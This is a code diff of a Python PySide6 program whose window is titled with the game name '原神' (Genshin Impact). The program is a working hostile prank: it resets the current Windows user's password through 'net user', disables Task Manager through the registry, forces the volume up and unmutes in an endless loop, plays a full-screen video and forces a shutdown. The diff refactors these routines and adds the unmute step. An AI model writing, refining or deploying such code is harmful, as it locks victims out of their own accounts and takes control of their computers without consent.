@@ -7,17 +7,48 @@ from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
 from PySide6.QtMultimediaWidgets import QVideoWidget
 from PySide6.QtWidgets import QMainWindow, QApplication
 
-from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from ctypes import POINTER, cast
+import comtypes
 
 
-def set_audio(volume):
+# 设置音量
+def set_audio(num: float):
     devices = AudioUtilities.GetSpeakers()
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
     # 设置音量（0.0到1.0之间的浮点数）
-    volume_interface.SetMasterVolumeLevelScalar(volume, None)
+    volume_interface.SetMasterVolumeLevelScalar(num, None)
+
+
+def get_audio_endpoint_volume():
+    try:
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(
+            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        return volume
+    except comtypes.COMError as e:
+        print(f"COMError: {e}")
+        return None
+
+
+# 取消静音
+def clear_mute():
+    volume = get_audio_endpoint_volume()
+    if volume is None:
+        print("无法获取音频设备")
+        return
+
+    try:
+        if volume.GetMute():
+            volume.SetMute(0, None)
+            print("系统已解除静音")
+        else:
+            print("系统未处于静音状态")
+    except comtypes.COMError as e:
+        print(f"COMError: {e}")
 
 
 class MainWindow(QMainWindow):
@@ -40,21 +71,20 @@ class MainWindow(QMainWindow):
         self._player.play()
 
 
-def ts():
+def main():
     while True:
         set_audio(1.0)
+        clear_mute()
 
 
 def disable_task_manage(num):
-    os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft'
-              '\Windows\CurrentVersion\Policies\System" /v DisableTask'
-              f'Mgr /t REG_DWORD /d {num} /f')
+    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')
 
 
-def passwd(password):
-    os.system('echo %username% > a')
+def set_passwd(password):
+    os.system('echo %username% > userName')
 
-    file = open('./a', 'r', encoding='utf-8')
+    file = open('./userName', 'r', encoding='utf-8')
     user_name = file.readlines()
     print(user_name, type(user_name))
     user_name = user_name[0].split()[0]
@@ -62,6 +92,8 @@ def passwd(password):
     print(user_name)
 
     os.system(f'net user {user_name} {password}')
+    file.close()
+    os.remove('./userName')
 
 
 if __name__ == '__main__':
@@ -77,15 +109,14 @@ if __name__ == '__main__':
     main_win.resize(available_geometry.width() / 3,
                     available_geometry.height() / 2)
     main_win.setWindowTitle('原神')
-    passwd(1145141919810)
+    set_passwd(1145141919810)
     main_win.showFullScreen()
     main_win.play()
 
     disable_task_manage(1)
     set_audio(1.0)
-    os.system('shutdown -s -f -t 60')
+    os.system('shutdown -s -f -t 150')
 
     threading.Thread(target=app.exec()).start()
-    threading.Thread(target=ts()).start()
+    threading.Thread(target=main()).start()
     sys.exit(app.exec())
-
